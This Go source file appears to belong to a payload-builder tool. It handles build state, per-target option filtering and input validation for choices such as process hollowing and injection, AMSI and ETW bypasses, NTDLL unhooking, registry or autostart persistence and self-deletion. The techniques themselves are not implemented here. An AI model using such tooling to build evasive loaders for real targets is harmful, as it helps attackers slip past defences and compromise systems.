package main

import "time"

// Build state machine
type BuildState int

const (
	BuildIdle BuildState = iota
	BuildRunning
	BuildCancelling
)

func (s BuildState) String() string {
	return []string{"Idle", "Running", "Cancelling"}[s]
}

// Platform flags for conditional options
const (
	PlatWin = 1 << 0
	PlatLin = 1 << 1
	PlatAll = PlatWin | PlatLin
)

// BuildJob represents a single build request
type BuildJob struct {
	Targets    []string      // ["linux", "windows"]
	Asset      string        // selected asset path
	EmbedAsset bool          // true = embed, false = HTTP fetch
	PkgConfig  PackageConfig // snapshot from Package tab
	StartedAt  time.Time
}

// TargetProgress tracks per-target build status
type TargetProgress struct {
	Target string // "linux" or "windows"
	Phase  string // "compiling", "packaging", "encrypting", "done"
	Done   bool
	Error  string // empty if success
}

// Platform mappings for conditional options
var execMethodPlatform = map[int]int{
	0: PlatAll, // Raw Binary
	1: PlatWin, // Process Ghosting
	2: PlatWin, // Process Hollowing
	3: PlatWin, // Process Herpaderping
	4: PlatWin, // APC Injection
	5: PlatWin, // Thread Hijacking
	6: PlatWin, // Threadless Injection
	7: PlatWin, // Module Stomping
}

var evasionPlatform = map[int]int{
	0: PlatWin, // AMSI Bypass
	1: PlatWin, // ETW Patch
	2: PlatWin, // NTDLL Unhook
	3: PlatWin, // PPID Spoof
	4: PlatWin, // Block DLL Policy
	5: PlatWin, // Anti-Debug
	6: PlatWin, // Anti-Analysis
	7: PlatWin, // Direct Syscalls
}

var persistPlatform = map[int]int{
	0: PlatAll, // None
	1: PlatWin, // Registry Run
	2: PlatLin, // XDG Autostart
	3: PlatWin, // Self-Delete
}

// requiresWindows returns true if any Windows-only option is selected
func (cfg *PackageConfig) requiresWindows() bool {
	if plat, ok := execMethodPlatform[cfg.ExecMethod]; ok && plat == PlatWin {
		return true
	}
	for i, on := range cfg.Evasion {
		if on {
			if plat, ok := evasionPlatform[i]; ok && plat == PlatWin {
				return true
			}
		}
	}
	if cfg.PersistMethod == 1 || cfg.PersistMethod == 3 {
		return true
	}
	return false
}

// requiresLinux returns true if any Linux-only option is selected
func (cfg *PackageConfig) requiresLinux() bool {
	return cfg.PersistMethod == 2 // XDG Autostart
}

// FilteredOptions holds options applicable to a specific platform
type FilteredOptions struct {
	ExecMethod int
	Evasion    []bool
	Persist    int
	Encrypt    bool
}

// optionsForTarget returns only the options applicable to the given target
func optionsForTarget(target string, cfg *PackageConfig) FilteredOptions {
	plat := PlatLin
	if target == "windows" {
		plat = PlatWin
	}

	result := FilteredOptions{
		Encrypt: cfg.Encrypt,
	}

	// Filter exec method
	if p, ok := execMethodPlatform[cfg.ExecMethod]; ok && (p&plat) != 0 {
		result.ExecMethod = cfg.ExecMethod
	}

	// Filter evasion
	result.Evasion = make([]bool, len(cfg.Evasion))
	for i, on := range cfg.Evasion {
		if on {
			if p, ok := evasionPlatform[i]; ok && (p&plat) != 0 {
				result.Evasion[i] = true
			}
		}
	}

	// Filter persistence
	if p, ok := persistPlatform[cfg.PersistMethod]; ok && (p&plat) != 0 {
		result.Persist = cfg.PersistMethod
	}

	return result
}

// ValidationResult holds validation outcome
type ValidationResult struct {
	Valid          bool
	Error          string   // blocking error message
	MissingWindows bool     // Windows options selected but no Windows target
	MissingLinux   bool     // Linux options selected but no Linux target
	SkippedOptions []string // options that will be skipped
}

// ValidateBuild checks if a build job is valid
func ValidateBuild(targets []string, asset string, embedMode bool, cfg *PackageConfig) *ValidationResult {
	result := &ValidationResult{Valid: true}

	// Check targets
	if len(targets) == 0 {
		result.Valid = false
		result.Error = "Select at least one target"
		return result
	}

	// Check asset in embed mode
	if embedMode && asset == "" {
		result.Valid = false
		result.Error = "Select an asset first"
		return result
	}

	// Check platform mismatches
	hasWindows := false
	hasLinux := false
	for _, t := range targets {
		if t == "windows" || t == "x86_64-pc-windows-gnu" {
			hasWindows = true
		}
		if t == "linux" || t == "x86_64-unknown-linux-gnu" {
			hasLinux = true
		}
	}

	if cfg.requiresWindows() && !hasWindows {
		result.MissingWindows = true
	}
	if cfg.requiresLinux() && !hasLinux {
		result.MissingLinux = true
	}

	return result
}
